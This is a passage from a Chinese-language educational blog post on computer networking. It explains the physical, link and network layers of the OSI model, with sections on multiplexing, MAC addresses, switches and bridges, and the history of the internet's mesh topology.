<h3 id="◇信噪比（Signal-to-noise-ratio）"><a href="#◇信噪比（Signal-to-noise-ratio）" class="headerlink" title="◇信噪比（Signal-to-noise ratio）"></a>◇<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E5%99%AA%E6%AF%94">信噪比</a>（Signal-to-noise ratio）</h3><p>　　俺在很多篇关于“学习＆心理学”的博文中提到过【信噪比】这个概念。其实这个概念是从通讯领域借用的术语。<br>　　对于“物理信道”，总是会存在某些环境干扰，称之为“噪声”（Noise）。“信道传输的有用信息”与“无用的干扰噪声”，这两者的比值就是“信噪比”。<br>　　“信噪比”单位是【分贝】。“分贝”洋文叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Decibel">decibel</a>”（简写为 dB）。“deci”表示“十进制”；“bel”是为了纪念大名鼎鼎的贝尔（电话它爹）。</p>
<h3 id="◇带宽的限制因素"><a href="#◇带宽的限制因素" class="headerlink" title="◇带宽的限制因素"></a>◇带宽的限制因素</h3><p>　　“物理信道”要依赖于物理传输介质。不管使用何种物理介质，都要受限于某些基本的物理学定律（比如“光速上限”）。另外，不管何种物理介质，总是会有或多或少的环境干扰（噪声）。这两个因素导致了：任何“物理信道”的最大传输率总是有限滴。<br>　　由于物理层是最底下的一层，物理层之上的其它层次总是要直接或间接地依赖【物理信道】。因此，其它层次建立的“逻辑信道”，其带宽只会比“物理信道”的最大带宽更小。换句话说：“物理信道”的带宽上限也就是整个协议栈的带宽上限。</p>
<h3 id="◇多路复用（Multiplexing）"><a href="#◇多路复用（Multiplexing）" class="headerlink" title="◇多路复用（Multiplexing）"></a>◇<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8">多路复用</a>（Multiplexing）</h3><p>　　一般来说，凡是能实现【长距离】通讯的“物理信道”，都有相当的经济成本。比如铺设“光纤、同轴电缆”都要花钱。无线电通讯虽然免去了铺设线路的成本，但需要竞标购买频段。因此，物理信道非常强调“多路复用”。<br>　　所谓的“多路复用”，通俗地说就是：尽可能地共享物理信道，不要浪费了。<br>　　“多路复用”有很多种类型；不同的类型，原理也不同。为了展示各种不同的原理，俺拿【无线通信】来说事儿。<br>　　无线通信领域的“多路复用”，【至少】有如下几种：</p>
<p><strong>频分多路复用/FDM（Frequency-Division Multiplexing）</strong><br>　　这个最简单，就是根据频率拆分。不同的线路占用不同的频段，互不干扰。（电台广播用的就是这个思路）<br>　　但这个思路的缺点很明显——<br>其一，要依赖足够宽的频段（频段是稀缺资源）；<br>其二，不同线路的流量可能会动态变化。如果某个线路空闲，其占用的频段就浪费了。<br>　　（注：光纤通讯中有个“波分多路复用/WDM”，本质上就是 FDM）</p>
<p><strong>时分多路复用/TDM（Time-Division Multiplexing）</strong><br>　　这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。<br>　　这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。<br>　　这个思路的优点是：可以只使用一个很窄的频段。缺点是：线路越多，每条线路等待越久；即使某个线路空闲，依然会占用时间片（浪费了资源）。</p>
<p><strong>码分多路复用/CDM（Code-Division Multiplexing）</strong><br>　　这种思路采用某种【编码】的技巧，使得多个端点可以在同一个时间点使用同一频段发送数据；由于他们采用不同的编码方式，不会相互干扰。<br>　　一般来说，CDM 要依赖于“扩频技术”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Spread_spectrum">spread spectrum</a>），需占用一个比较宽的频道范围。这算是缺点。但其优点很明显——<br>其一，可以支持 N 个线路（N 动态变化）；<br>其二，即使任何一个线路的流量动态变化，也不会浪费物理信道的资源。<br>　　显然，这种思路明显优于 FDM ＆ TDM。如今在移动通讯领域大名鼎鼎的 CDMA（码分多址），采用的就是这个思路。</p>
<h2 id="★物理层：具体实例"><a href="#★物理层：具体实例" class="headerlink" title="★物理层：具体实例"></a>★物理层：具体实例</h2><h3 id="◇物理层的【协议】"><a href="#◇物理层的【协议】" class="headerlink" title="◇物理层的【协议】"></a>◇物理层的【协议】</h3><p>　　物理层的协议主要有如下：<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Universal_Serial_Bus">USB 协议</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols">蓝牙协议</a>的一部分<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.16">IEEE 802.16</a>（WiMAX）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_1394">IEEE 1394</a>（火线接口）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RS-232">RS-232 协议</a>（串行接口/串口）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p>
<h3 id="◇物理层的【协议实现】"><a href="#◇物理层的【协议实现】" class="headerlink" title="◇物理层的【协议实现】"></a>◇物理层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件”包含了物理层的协议实现（参见如下示意图）<br>　　另外，还有一些专门的【1层】网络设备，也提供物理层的功能（参见下一个小节）。</p>
<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
<h3 id="◇物理层相关的【网络设备】"><a href="#◇物理层相关的【网络设备】" class="headerlink" title="◇物理层相关的【网络设备】"></a>◇物理层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%88%B6%E8%A7%A3%E8%B0%83%E5%99%A8">调制解调器</a>（modem）</strong><br>　　通俗地说，“调制解调器”就是用来翻译“数字信号 ＆ 模拟信号”。<br>　　在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。<br>　　早期的拨号上网，modem 面对的物理介质是“固话线路”；如今家庭宽带普及，光纤入户，modem 面对的物理介质是“光纤线路”。</p>
<p><img src="https://lh6.googleusercontent.com/nfl3YFl3Bgg13u0xQV0CsGvLSObLDDbGI5wuDcGTulde_klpLWZX9fhpGbiE1SgAJYBDVUtrM4MwjV5Hy6DYA5YC7gKyVaQs-xy_kUdC1jm1hWnAuHdq9q3VDhxoMPbJxEYlL6pONFw" alt="不见图 请翻墙"><br>（老式 modem，用于固定电话线路）</p>
<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Repeater">中继器</a>（repeater）</strong><br>　　信号在物理介质中传输，会出现【衰减】（不论是“有线 or 无线”都有可能衰减）。“中继器”的作用是【信号增益】，使得信号能传得更远。<br>　　另外，比如“微波通讯”是直线传播，而地球表面有弧度，还有地形的起伏。所以每隔一定距离要建“微波塔”。这玩意儿也相当于“中继器”。</p>
<p><img src="https://lh4.googleusercontent.com/DQOkSWCmJO86Vc1hNJhGONs8j2oHbjS8hlA1XxFL7OIrdPsGT9amhbHzoKHjo8S0aTfVQYgKoBPvP0vEw8lvLEby6OubBeTkHZaV1sikpzIgvVGmLYT_nSmHMZqfJFmUowukZ5pbOoY" alt="不见图 请翻墙"><br>（微波塔示意图）</p>
<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%86%E7%B7%9A%E5%99%A8">集线器</a>（hub）</strong><br>　　可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。<br>　　通常所说的“集线器”是指“以太网集线器”。这种设备如今已经逐步淘汰，很少见到了。</p>
<p><img src="https://lh3.googleusercontent.com/JdWYf1BMAyz3Td7XLh7Yuu0YxQLtIzhWHvPhp_xXszrTH-MPiarsWjh9zyL-0Mx0ysRbxANYwaoH6J5OAUC8Hkd58Wx0TIu5D5-AtmWoDpGnGs9aOu7T3Uzc8bYWcUmu5ZCVEH14L44" alt="不见图 请翻墙"><br>（老式的10兆以太网集线器）</p>
<p>　　另外，很多同学应该都用过“USB hub”，就是针对 USB 线的“集线器”（“USB 线”也可以视作某种通讯介质）。</p>
<h2 id="★链路层：概述"><a href="#★链路层：概述" class="headerlink" title="★链路层：概述"></a>★链路层：概述</h2><h3 id="◇链路层的必要性"><a href="#◇链路层的必要性" class="headerlink" title="◇链路层的必要性"></a>◇链路层的必要性</h3><p><strong>对信息的打包</strong><br>　　物理层传输的信息，通俗地说就是【比特流】（也就是一长串比特）。但是对于计算机来说，“比特流”太低级啦，处理起来极不方便。“链路层”要干的第一个事情，就是把“比特流”打包成更大的一坨，以方便更上层的协议进行处理。在 OSI 模型中，链路层的一坨，称之为“帧”（frame）。</p>
<p><strong>差错控制</strong><br>　　物理介质的传输，可能受到环境的影响。这种影响不仅仅体现为“噪声”，有时候会出现严重的干扰，导致物理层传输的“比特流”出错（某个比特“从0变1”或“从1变0”）。因此，链路层还需要负责检查物理层的传输是否出错。在 IT 行话中，检测是否出错，称之为“差错控制机制”（后面有一个小节会简单说一下这个话题）。</p>
<p><strong>流量控制</strong><br>　　假设两个端点通过同一个物理信道进行通讯，这两个端点处理信息的速度可能不同。如果发送方输出信息的速度超过接收方处理信息的速度，通讯就会出问题。于是就需要有某种机制来协调，确保发送方的发送速度不会超出接收方的处理速度。在技术行话中，这称之为“流量控制”，简称“流控”。</p>
<p><strong>信道复用</strong><br>　　在上一个章节已经讲到：用于远距离通讯的“物理介质”，总是有成本。因此需要对物理信道进行“多路复用”，就会导致多个端点共用同一个物理信道。如果同时存在多个发送者和多个接收者。接收者如何知道某个信息是发给自己而不是别人？<br>　　另外，某些物理介质可能不支持并发（无法同时发送信息）。某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。后续小节会聊它。</p>
<h3 id="◇差错控制"><a href="#◇差错控制" class="headerlink" title="◇差错控制"></a>◇差错控制</h3><p>　　为了发现传输的信息是否出错，设计了很多相应的数学算法。这些算法大体分为两类：“检错算法 ＆ 纠错算法”。<br>　　简而言之，“检错算法”只能检测出错误，而“纠错算法”不但能检测出错误，还能纠正错误。很显然，“纠错算法”更牛逼，但是它也更复杂。<br>　　常见的“检错算法”对传输的数据计算出一个【校验值】，接收方收到数据会重新计算校验和，如果算出来不对，就把收到的数据丢弃，让对方重发。“校验算法”的原理类似于《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/02/file-integrity-check.html">扫盲文件完整性校验——关于散列值和数字签名</a>》一文中提到的“散列算法/哈希算法”。<br>　　“纠错算法”更高级，由于涉及到更多数学，俺就不展开啦。<br>　　对于【无线】物理信道，由于出错的概率更高，并且重新传输数据的成本也更高。所以【无线】通讯的链路层协议，更倾向于用【纠错】机制；作为对比，【有线】通讯的链路层协议，更倾向于用【检错】机制。</p>
<h3 id="◇MAC-协议"><a href="#◇MAC-协议" class="headerlink" title="◇MAC 协议"></a>◇<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Medium_access_control">MAC 协议</a></h3><p>　　“MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。为了形象，俺拿“铁路系统”来比喻，说明“MAC 协议”的用途。<br>　　假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。<br>　　首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。<br>　　所有这些协调工作，都是靠“MAC 协议”来搞定。</p>
<h3 id="◇MAC-地址"><a href="#◇MAC-地址" class="headerlink" title="◇MAC 地址"></a>◇MAC 地址</h3><p>　　为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。<br>　　通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。</p>
<p>　　如何保证 MAC 地址全球唯一捏？简单说一下：<br>　　MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。<br>　　MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。</p>
<p><img src="https://lh6.googleusercontent.com/p1BJLdyURQLXwjaX9w6zrYxmzkFitCfuXYxEnQ8o2WaciD67PpWKUzx2MM4s7ay2Ds9Ltn4oHERF0uq17z_zaEIZFvRBqDb2U7WUPtAVM9Cve1_BUtd8Emx-073rj3jpizDMZRwdQ5o" alt="不见图 请翻墙"><br>（MAC 地址的构成）</p>
<p>　　由于俺在很多安全教程中鼓吹大伙儿使用“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">操作系统虚拟机</a>”，再顺便说说【虚拟网卡】的 MAC 地址。<br>　　“虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（<code>224 = 16777216</code>），碰巧一样的概率很低。<br>　　（注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题）</p>
<h2 id="★链路层：具体实例"><a href="#★链路层：具体实例" class="headerlink" title="★链路层：具体实例"></a>★链路层：具体实例</h2><h3 id="◇链路层的【协议】"><a href="#◇链路层的【协议】" class="headerlink" title="◇链路层的【协议】"></a>◇链路层的【协议】</h3><p>　　链路层的协议主要有如下：<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Media_access_control">MAC 协议</a>（介质访问控制）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Logical_link_control">LLC 协议</a>（逻辑链路控制）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP 协议</a>（解析 MAC 地址）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.3">IEEE 802.3</a>（以太网）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol">L2TP 协议</a>（2层VPN）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Point-to-Point_Protocol">PPP 协议</a>（拨号上网）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Serial_Line_Internet_Protocol">SLIP 协议</a>（拨号上网）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p>
<h3 id="◇链路层的【协议实现】"><a href="#◇链路层的【协议实现】" class="headerlink" title="◇链路层的【协议实现】"></a>◇链路层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件 ＆ 网卡驱动”会包含链路层协议的实现（参见如下示意图）。<br>　　另外，还有一些专门的【2层】网络设备，也提供链路层的功能（参见下一个小节）。</p>
<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
<h3 id="◇链路层相关的【网络设备】"><a href="#◇链路层相关的【网络设备】" class="headerlink" title="◇链路层相关的【网络设备】"></a>◇链路层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">网络交换机</a>（network switch）</strong><br>　　（注：一般提到“网络交换机”，如果不加定语，指的就是“2层交换机”；此外还有更高层的交换机，在后续章节介绍）<br>　　为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。<br>　　以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【1层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有4台电脑（A、B、C、D）都连在集线器上，A 发数据给 B，其实 C ＆ D 也都收到 A 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“10兆”，所以集线器虽然低效，还能忍受。<br>　　后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。<br>　　交换机是工作在2层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。<br>　　由于交换机能识别2层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。</p>
<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A1%A5%E6%8E%A5%E5%99%A8">网桥/桥接器</a>（network bridge）</strong><br>　　“交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。<br>　　下面以“操作系统虚拟机”来举例（完全没用过虚拟机的同学，请跳过这个举例）。<br>　　在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【bridge 模式】。一旦设置了这种模式，Guest OS 的虚拟网卡，对于 Host OS 所在的外部网络，是【双向】可见滴。也就是说，物理主机所在的外部网络，也可以看见这块虚拟网卡。<br>　　现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？<br>　　奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。<br>　　这种网卡模式之所以称作“bridge 模式”，原因就在于此。</p>
<h3 id="◇链路层相关的【软件工具】"><a href="#◇链路层相关的【软件工具】" class="headerlink" title="◇链路层相关的【软件工具】"></a>◇链路层相关的【软件工具】</h3><p><strong>嗅探抓包工具（Sniffer）</strong><br>　　要了解链路层的数据包结构，需要用到“嗅探工具”。这类工具能捕获流经你网卡的所有【链路层】数据包。前面聊“协议栈”的时候说过：下层数据包的载荷就是上层数据包的整体。因此，拿到【链路层】数据包也就意味着：你已经拿到2层之上的所有数据包的信息了。<br>　　有些抓包工具自带图形界面，可以直接显示数据包的内容给你看。还有些只提供命令行（只是把获取的数据包保存为文件），然后要搭配其它图形化的工具来展示数据包的内容。<br>　　抓包的工具有很多，名气最大的是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wireshark">Wireshark</a>（原先叫做 Ethereal）。</p>
<p><strong>ARP 命令</strong><br>　　首先，ARP 是“MAC 地址解析协议”的洋文名称。该协议根据“IP 地址”解析“MAC 地址”。<br>　　Windows 自带一个同名的 <code>arp</code> 命令，可以用来诊断与“MAC 地址”相关的信息。比如：列出当前子网中其它主机的 IP 地址以及对应的 MAC 地址。这个命令在 Linux ＆ Mac OS 上也有。</p>
<h2 id="★网络层：概述"><a href="#★网络层：概述" class="headerlink" title="★网络层：概述"></a>★网络层：概述</h2><h3 id="◇网络层的必要性"><a href="#◇网络层的必要性" class="headerlink" title="◇网络层的必要性"></a>◇网络层的必要性</h3><p><strong>路由机制（routing）</strong><br>　　在 OSI 模型中，链路层本身【不】提供路由功能。你可以通俗地理解为：链路层只处理【直接相连】的两个端点（注：这么说不完全严密，只是帮助外行理解）<br>　　对于某个复杂网络，可能有很多端点，有很复杂的拓扑结构。当拓扑足够复杂，总有一些端点之间【没有直连】。那么，如何在这些【没有直连】的端点之间建立通讯捏？此时就需要提供某种机制，让其它端点帮忙转发数据。这就需要引入“路由机制”。<br>　　为了避免把“链路层”搞得太复杂，路由机制放到“链路层”之上来实现，也就是“网络层”。</p>
<p><strong>基于【路由】的地址编码方式</strong><br>　　链路层已经提供了某种全球唯一的地址编码方式（MAC 地址）。但“MAC 地址”有如下几个问题：<br>其一，它是固定的（虽然可以用技术手段去修改 MAC 地址，但很少这么干）<br>其二，MAC 地址的编码是基于【厂商】，无法体现网络拓扑结构。或者说，“MAC 地址”对于“路由机制”是不够友好滴。<br>　　因此，需要引入一种更抽象（更高层）的地址，也就是“网络层地址”。咱们常说的“IP 地址”，是“网络层地址”的实现方式之一。</p>
<p>　　为了帮你理解，举个例子：<br>　　每个人都有身份证号（这就类似于“MAC 地址”）。当某人加入了某个公司，公司会为此人再分配一个“员工号”（这就类似于“网络地址”）。既然有身份证号，为啥公司还要另搞一套“员工编号”捏？因为“员工编号”有额外的好处。比如说：可以把员工号划分为不同的区间，对应不同的部门。这样一来，只要看到员工号，就知道此人来自哪个部门。<br>　　类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。</p>
<p><strong>网际互联（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internetworking">internetwork</a>）</strong><br>　　引入“网络层”的另一个目的是：屏蔽不同类型的网络之间的差异，从而有利于【网际互联】（也就是建立“网络的网络”）。<br>　　一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。<br>　　假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。<br>　　反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。<br>　　如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。</p>
<p><img src="https://lh3.googleusercontent.com/zrXBFWSDp-D4VebTx73Un03rN3zKCjVL6Ax_VURmxZyaIj_bfr09TwYya1F6GyNz3W5JLmEvzDggkDPYuHpCdHfWjKHDHp-pBVubeDazpi7Ie9CHYbhJkVP1c48JSZJhpKn8zftthOo" alt="不见图 请翻墙"><br>（互联网整合了各种类型的网络）</p>
<h3 id="◇网络拓扑（network-topology）"><a href="#◇网络拓扑（network-topology）" class="headerlink" title="◇网络拓扑（network topology）"></a>◇网络拓扑（network topology）</h3><p>　　网络的拓扑结构有很多种，有简单的，有复杂的。一般来说，再复杂的拓扑，也可以逐步分解为若干简单拓扑的组合。<br>　　对拓扑的研究，有专门一个数学分支（拓扑学）。考虑到本文只是扫盲，俺不可能再去聊“拓扑学”。因此，只挑几种简单的拓扑结构，让大伙儿有个直观的印象。</p>
<p><img src="https://lh5.googleusercontent.com/ccFqOwvxYuPyelLkW1KRh77tNfUR3TCMMSFN0YgJKJSUfBWISxnzj7mRKLvAP5FvCb2YJDZ8aZO7wRKslvltbWm5fn0QJk3uWp5F3xQy_GFXWVx__c1kDD-cV7HHejxuwqvR6ombf_M" alt="不见图 请翻墙"><br>（常见的网状拓扑结构：星形拓扑、环形拓扑、总线拓扑、网状拓扑、等等）</p>
<p>　　如今的互联网，整体的拓扑结构超级复杂。但还是可以逐步分解为上述几种基本的拓扑结构。</p>
<p><img src="https://lh3.googleusercontent.com/l2JVK5up10o5jLkXzIgrcNcTBpnXtmeBKxyHqhuxmqDFlAGDF8pXDqHhRfTf7kAeNLYrgnnI0HVElnFE-JKZXpwcC2Y1f12v5bftW4_6KIYQqY-77tI_pE---r3L3Fwle2i0PTgAnEc" alt="不见图 请翻墙"><br>（互联网的复杂拓扑，右下角是图中某个小点的放大。<br>为节省大伙儿的翻墙流量，俺贴的是缩小图。点“<a target="_blank" rel="noopener" href="https://upload.wikimedia.org/wikipedia/commons/d/d2/Internet_map_1024.jpg">这里</a>”看原始图）</p>
<h3 id="◇互联网的拓扑——从“历史”的角度看其健壮性"><a href="#◇互联网的拓扑——从“历史”的角度看其健壮性" class="headerlink" title="◇互联网的拓扑——从“历史”的角度看其健壮性"></a>◇互联网的拓扑——从“历史”的角度看其健壮性</h3><p>　　从上面那张图可以看出：互联网拓扑的【局部】有很多是“星形拓扑”（当然也有其它的）。但从【宏观】上看，更像是“网状拓扑”。<br>　　在现实生活中，对于复杂结构，通常都会采用“树状层次结构”，以便于管理。比如：域名系统、公司组织结构、官僚系统 …… 那为啥互联网的【宏观】拓扑结构是“网状”捏？这就要说到互联网的历史。</p>
<p>　　在上世纪50年代（冷战高峰期），美国军方的指挥系统高度依赖于电信公司提供的电话网络。当时的电话网络大致如下——<br>在基层，每个地区有电话交换局，每一部电话都连入当地的交换局。<br>在全国，设有若干个长途局，每个交换局都接入某个特定的长途局（不同地区的交换局通过长途局中转）。<br>　　简而言之，当时美国的电话网络是典型的【多级星形拓扑】。这种拓扑的优点是：简单、高效、便于管理；但缺点是：健壮性很差。从这个案例中，大伙儿可以再次体会到“效率”与“健壮性”之间的矛盾。俺写过一篇很重要的博文（<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">这里</a>）深入讨论了这个话题。<br>　　话说1957年的时候，苏联成功试射第一颗洲际弹道导弹（ICBM），美国军方开始担心：一旦苏联先用洲际导弹攻击美国，只要把少数几个长途局轰掉，军方的指挥系统就会瘫痪。也就是说，“长途局”已经成为美国军方的【单点故障】（何为“单点故障”？参见<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2015/04/Single-Point-of-Failure.html">这篇博文</a>）。<br>　　1960年，美国国防部找来大名鼎鼎的兰德公司进行咨询，要求提供一个应对核打击的方案。该公司的研究员 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Paul_Baran">Paul Baran</a> 设计了一个方案，把“星形拓扑”改为【网状拓扑】。采用【网状拓扑】的好处在于：即使发生全面核大战，大量骨干节点被摧毁，整个网络也不会被分隔成几个孤岛，军方的指挥系统依然能正常运作。</p>
<p><img src="https://lh5.googleusercontent.com/IE-FTOWlH2Z5OjbyXQ18nnjCRMoQrk1jfjoyIuLApcwU1AGPhu0mFgJL65IkOsvADshV1Fxbfb4bSn54Xy4m08lDE-n-mtnaSYAAGCgIUZSvVZo-8IAPPzFyLUcZdvq_JWsoUOsfdZQ" alt="不见图 请翻墙"><br>（左边：互联网诞生前——美国的电话网络　　右边：兰德公司的“Baran 方案”）</p>
<p>　　有了兰德公司的方案，美国军方找到当时最大的电信公司 AT＆T，想要实现这个系统，结果被否决了。AT＆T 高层认为：搞这样一种系统根本不切实际。于是 Baran 的方案中途夭折。<br>　　为啥 AT＆T 反对这个方案捏？一方面，成功的大公司总是有很强的思维定势；另一方面，Baran 的设计方案确实很超前——其前瞻性不仅包括“拓扑结构”，而且把当时电信行业的几大核心观念完全颠覆掉了（具体如何颠覆，后续章节还会再聊）。<br>　　时间一晃又过了好多年，到了60年代末，由于一系列机缘巧合，英国佬发现了“Baran 方案”的价值，并据此搞了一个小型的 NPL 网络（NPL 是“国家物理实验室”的缩写）。然后在某次 ACM 会议上，美国佬看到英国佬的论文，才意识到：Baran 方案完全可行。经历了“出口转内销”的命运之后，该方案重新被美国国防部重视。之后，（国防部下属的）“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%98%B2%E9%AB%98%E7%AD%89%E7%A0%94%E7%A9%B6%E8%A8%88%E5%8A%83%E7%BD%B2">高级计划研究局</a>”（ARPA）开始筹建“阿帕网”（ARPANET），才有了如今的互联网。</p>
